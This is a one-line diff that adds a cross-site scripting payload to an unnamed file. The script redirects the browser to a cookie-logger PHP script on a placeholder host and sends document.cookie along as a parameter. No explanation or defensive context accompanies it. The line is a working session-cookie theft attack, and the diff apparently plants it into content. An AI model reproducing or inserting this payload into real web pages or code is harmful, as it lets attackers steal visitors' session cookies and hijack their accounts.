@@ -1,0 +1,1 @@
+<script>location.href='http://www.yoursite.com/cookielogger.php?cookie='+escape(document.cookie)</SCRIPT>
